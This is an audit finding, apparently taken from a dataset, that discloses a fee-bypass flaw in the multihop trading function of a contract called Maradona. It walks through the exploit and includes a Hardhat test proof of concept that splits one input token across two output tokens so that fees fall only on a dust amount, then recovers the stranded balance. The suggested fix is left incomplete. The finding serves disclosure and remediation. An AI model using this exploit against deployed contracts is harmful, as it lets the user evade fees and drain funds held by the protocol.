# [H] Multihop trade allows bypassing fees by set-

## Summary
Severity: High
Contest weight: 0.7688
Dataset id: 22801
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
A trader can bypass fees by setting two different output tokens for the same input token. Then only the second (fake) output token will be charged fees, and the first (real) output token remains in the contract. The trader can then retrieve the real output token by simply trading dust amount with the same output token (as outlined by the README). By setting the second output token's trade to an extremely small value in the initial trade, the trader can bypass fees completely. Consider the following scenario. Alice wants to trade 1 ETH into USDC. If she trades through Maradona as normal, she will have to take the full fee. Alice can set up the following trade through takeTokensAndTrade() to dodge fees: • Two operations • Operation 1: – ETH to USDC – Amount in = 0.9999999999999 ETH • Operation 2: – ETH to USDT – Amount in = 0.0000000000001 ETH • Fee token: USDT What will happen is that: • The two operations are performed in order: – (almost) 1 ETH gets traded into USDC – Dust amount of ETH gets traded into dust amount of USDT • After the swaps are completed, some fees are charged from the output USDT (which is a dust amount), and the rest is returned to Alice • The remaining USDC are stuck in the contract However, Alice can now perform a trade using dust amount of input ETH to USDC (and with ETH as the fee token), and the contract's entire USDC balance will be sent back to Alice, for another dust amount of ETH fee. • Breaks core invariant of the protocol that there should be no set of inputs that leaves balance within the contract • Fees can be bypassed completely

## Proof of Concept
```solidity
it.only("PUSH0 PoC", async function () {
    // Load fixture elements
    const {signers, maradona, mockMarkets, mockTokens} = await loadFixture(deployFixture);
    // User stuff
    const owner = signers[0];
    const users = signers.slice(1);
    const sponsor = users[0];
    const traders = users.slice(1);
    const trader = traders[0];
    const traderAddress = trader.address.toLowerCase();
    // update sponsor
    await maradona.connect(owner).updateCollector(sponsor.address)
    // Token stuff
    const middleToken = mockTokens[1];
    const middleTokenAddress = mockTokens[1].target.toString();
    const outputToken = mockTokens[2];
    const outputTokenAddress = outputToken.target.toString();
    // two operations:
    // Op1: ETH ---> output token, amount = 3
    // Op2: ETH ---> middle token, amount = 1
    // Fee token: Middle token
    // Result: 0.9995 middle tokens are returned
    // 3 output tokens stuck in the contract
    // Now we can trade anything with the same output tokens to get those out
    const valueONE = ethers.parseEther("1");
    const valueTHREE = ethers.parseEther("3");
    const feeBps = toBigInt(5);
    const feeValue = toBigInt(2) * valueONE * feeBps / toBigInt(10000)
    const opParams: OperationParametersStruct[] = [getEmptyOpParams(), getEmptyOpParams()];
    opParams[0].inputToken = ethers.ZeroAddress
    opParams[0].outputToken = outputTokenAddress
    opParams[0].ratioBPs = toBigInt(7500)
    opParams[0].amountIn = valueTHREE.toString()
    opParams[0].exchangeID = 1
    opParams[1].inputToken = ethers.ZeroAddress
    opParams[1].outputToken = middleTokenAddress
    opParams[1].ratioBPs = toBigInt(2500)
    opParams[1].amountIn = valueONE.toString()
    opParams[1].exchangeID = 1
    // trade and test!
    const balanceBefore = await ethers.provider.getBalance(traderAddress)
    const erc20BalanceBefore = await outputToken.balanceOf(traderAddress)
    const sponsorBalanceBefore = await ethers.provider.getBalance(sponsor.address)
    expect(await ethers.provider.getBalance(maradona.target)).to.be.equal(toBigInt(0))
    expect(await outputToken.balanceOf(maradona.target)).to.be.equal(toBigInt(0))
    const tx = await maradona.connect(trader).takeTokensAndTrade(
        opParams,
        "0",
        owner.address,
        traderAddress,
        middleTokenAddress,
        {
            value: valueONE + valueTHREE,
        }
    )
    const rx = await tx.wait();
    const txGas = rx ? rx.cumulativeGasUsed * rx.gasPrice : toBigInt(0);
    expect(await ethers.provider.getBalance(maradona.target)).to.be.equal(toBigInt(0))
    expect(await middleToken.balanceOf(maradona.target)).to.be.equal(toBigInt(0))
    expect(await outputToken.balanceOf(maradona.target)).to.be.greaterThan(toBigInt(0))
    console.log(await outputToken.balanceOf(maradona.target))
    console.log(await middleToken.balanceOf(traderAddress))
});
```
Then run the test with the command make tests/Maradona The test will be successful with the following logs: The outputs show, respectively: • The Maradona contract's outputToken balance is 3 • The trader's middleToken balance is 0.9995 (with 0.05% fee charged) With the outputToken left behind in the contract, it can be retrieved by the attacker by performing a simple dust swap with it as the output (as outlined in the README)

## Recommendation
The root cause is that the input allows two identical input tokens for two different output tokens. Normally the contract should only allow, for the same input tokens, also the same output tokens, differing only in their exchanging market. We think the easiest fix is by adding an else case here:
```diff
if (i > 0
    && op.inputToken != lastAddress) {
    require(cumRatio == 10000, "Maradona: cumRatio is not 10000");
    cumRatio = 0;
    prevCumOutputAmount = cumOutputAmount;
    cumOutputAmount = 0;
    canBeFromEth = false;
    mustUseContractFunds = true;
} else {
    // input token for this operation is the same as previous
    // validate that output token is the same as well
}
```
And similarly for Messi: Which will validate the set of input as the swap operations are performed
